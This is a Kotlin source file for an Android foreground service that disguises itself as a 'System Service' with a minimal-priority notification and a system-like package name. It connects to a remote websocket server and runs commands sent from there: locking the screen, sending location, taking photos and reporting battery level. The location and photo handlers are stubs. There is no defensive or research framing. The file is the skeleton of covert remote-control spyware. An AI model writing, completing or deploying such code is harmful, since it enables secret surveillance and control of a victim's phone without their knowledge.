package com.system.service.core

import android.app.*
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.system.service.R
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        lateinit var instance: CoreService
        // Apna server URL yahan daalo
        const val SERVER_URL = "wss://YOUR_CLOUDFLARE_URL"
    }

    lateinit var wsManager: WebSocketManager

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForeground(1, buildNotification())
        connectServer()
    }

    private fun connectServer() {
        wsManager = WebSocketManager(
            serverUrl = SERVER_URL,
            onMessage = { handleCommand(it) },
            onConnected = { },
            onDisconnected = { }
        )
        wsManager.connect()
    }

    private fun handleCommand(data: JSONObject) {
        when (data.optString("command")) {
            "lock_screen" -> lockScreen()
            "get_location" -> sendLocation()
            "take_photo" -> takePhoto()
            "get_battery" -> sendBattery()
        }
    }

    fun sendData(type: String, data: JSONObject) {
        data.put("type", type)
        data.put("timestamp", System.currentTimeMillis())
        wsManager.send(data)
    }

    private fun lockScreen() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) 
            as android.app.admin.DevicePolicyManager
        dpm.lockNow()
    }

    private fun sendLocation() {
        // LocationMonitor se location leke bhejte hain
    }

    private fun takePhoto() {
        // CameraMonitor se photo leke bhejte hain
    }

    private fun sendBattery() {
        val bm = getSystemService(BATTERY_SERVICE) 
            as android.os.BatteryManager
        val level = bm.getIntProperty(
            android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        sendData("battery", JSONObject().apply {
            put("level", level)
        })
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "main", "System", 
            NotificationManager.IMPORTANCE_MIN)
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, "main")
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onStartCommand(intent: Intent?, f: Int, id: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
